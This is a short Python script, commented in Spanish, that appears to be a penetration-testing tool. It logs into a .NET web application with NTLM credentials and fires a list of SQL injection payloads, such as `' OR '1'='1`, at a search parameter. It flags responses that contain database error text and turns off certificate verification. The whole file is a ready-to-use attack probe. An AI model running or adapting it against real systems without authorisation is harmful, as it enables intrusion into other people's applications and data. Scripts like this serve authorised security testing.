#!/usr/bin/env python3
"""
Tester de SQLi con NTLM - Prueba payloads comunes de inyeccion SQL contra
un parametro de busqueda en una webapp .NET con auth NTLM. Detecta SQLi
basado en errores buscando keywords de error de base de datos en las respuestas.

Uso: python3 ntlm-sqli-tester.py
  - Configurar TARGET, DOMAIN, USERNAME, PASSWORD, ENDPOINT, PARAM.
"""
import requests
from requests_ntlm import HttpNtlmAuth

requests.packages.urllib3.disable_warnings()

TARGET = "https://TARGET_HOST"
DOMAIN = "DOMAIN"
USERNAME = "USERNAME"
PASSWORD = "PASSWORD"
ENDPOINT = "/Package"
PARAM = "search"

s = requests.Session()
s.auth = HttpNtlmAuth(f"{DOMAIN}\\{USERNAME}", PASSWORD)

tests = [
    "test", "'", "''", "test'--", 'test"',
    "1) OR (1=1", "test' OR '1'='1",
    "%", "*", "test;--", "test`",
]

error_keywords = (
    "sql", "syntax", "exception", "stack", "ora-",
    "sqlite", "postgres", "mysql", "odbc", "invalid",
)

for t in tests:
    r = s.get(
        TARGET + ENDPOINT,
        params={PARAM: t},
        verify=False,
        allow_redirects=False,
        timeout=20,
    )
    snippet = ""
    low = r.text.lower()
    for kw in error_keywords:
        if kw in low:
            i = low.find(kw)
            snippet = r.text[max(0, i - 60):i + 120].replace("\n", " ")
            break
    print(f"[{r.status_code}] len={len(r.content):6} {PARAM}={t!r} {snippet}")
